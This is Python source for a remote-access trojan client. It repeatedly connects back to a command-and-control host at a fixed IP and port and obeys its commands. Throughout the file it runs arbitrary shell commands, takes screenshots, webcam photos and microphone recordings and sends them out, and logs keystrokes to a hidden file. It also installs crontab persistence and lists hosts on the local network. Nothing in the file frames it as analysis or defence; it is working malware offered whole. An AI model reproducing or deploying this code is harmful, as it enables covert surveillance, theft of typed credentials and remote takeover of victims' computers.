import socket
import subprocess
import os
import threading
import platform
import time

HOST = "192.168.56.116"  
PORT = 4444

KEYLOG_FILE = "/tmp/.keylog.txt"
KEYLOG_RUNNING = False

def reliable_send(sock, data):
    try:
        sock.sendall(data)
    except:
        pass

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output
    except subprocess.CalledProcessError as e:
        return e.output

def handle_command(sock, cmd):
    global KEYLOG_RUNNING

    if cmd == "get_sysinfo":
        info = f"{platform.platform()}\n{platform.node()}\n{os.getlogin()}"
        reliable_send(sock, info.encode())
    elif cmd.startswith("exec "):
        output = execute_command(cmd[5:])
        reliable_send(sock, output)
    elif cmd == "screenshot":
        filename = "/tmp/screen.png"
        result = execute_command(f"scrot {filename}")
        if os.path.exists(filename):
            with open(filename, "rb") as f:
                reliable_send(sock, b"_OK_" + f.read())
            os.remove(filename)
        else:
            reliable_send(sock, b"_ERR_Screenshot failed")
    elif cmd == "camera_snap":
        filename = "/tmp/webcam.jpg"
        result = execute_command(f"fswebcam --no-banner {filename}")
        if os.path.exists(filename):
            with open(filename, "rb") as f:
                reliable_send(sock, b"_OK_" + f.read())
            os.remove(filename)
        else:
            reliable_send(sock, b"_ERR_Camera capture failed")
    elif cmd == "mic_record":
        filename = "/tmp/mic.wav"
        result = execute_command(f"arecord -d 5 -f cd {filename}")
        if os.path.exists(filename):
            with open(filename, "rb") as f:
                reliable_send(sock, b"_OK_" + f.read())
            os.remove(filename)
        else:
            reliable_send(sock, b"_ERR_Mic recording failed")
    elif cmd == "keylog_start":
        if not KEYLOG_RUNNING:
            threading.Thread(target=start_keylogger, daemon=True).start()
            KEYLOG_RUNNING = True
            reliable_send(sock, b"[OK] Keylogger started")
        else:
            reliable_send(sock, b"[OK] Keylogger already running")
    elif cmd == "keylog_dump":
        if os.path.exists(KEYLOG_FILE):
            with open(KEYLOG_FILE, "rb") as f:
                reliable_send(sock, b"_OK_" + f.read())
        else:
            reliable_send(sock, b"_ERR_No keylog data")
    elif cmd == "persistence":
        path = os.path.abspath(__file__)
        job = f"@reboot python3 {path}\n"
        crontab = subprocess.getoutput("crontab -l 2>/dev/null")
        if job.strip() not in crontab:
            new_crontab = crontab + "\n" + job
            subprocess.run(f'(echo "{new_crontab.strip()}") | crontab -', shell=True)
            reliable_send(sock, b"[OK] Persistence installed via crontab")
        else:
            reliable_send(sock, b"[OK] Already persistent")
    elif cmd == "scan_lan":
        result = execute_command("ip neigh")
        reliable_send(sock, result)
    else:
        reliable_send(sock, f"Unknown command: {cmd}".encode())

def start_keylogger():
    try:
        from pynput import keyboard
        with open(KEYLOG_FILE, "a") as f:
            def on_press(key):
                try:
                    f.write(f"{key.char}")
                except AttributeError:
                    f.write(f"[{key.name}]")
                f.flush()

            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
    except Exception as e:
        with open(KEYLOG_FILE, "a") as f:
            f.write(f"[Error starting keylogger: {e}]\n")

def main():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((HOST, PORT))
            print("[+] Connected to C2")
            break
        except:
            time.sleep(5)

    while True:
        try:
            cmd = sock.recv(1024).decode().strip()
            if cmd:
                handle_command(sock, cmd)
        except Exception as e:
            print(f"[!] Connection lost: {e}")
            sock.close()
            time.sleep(5)
            main()
            break

if __name__ == "__main__":
    main()
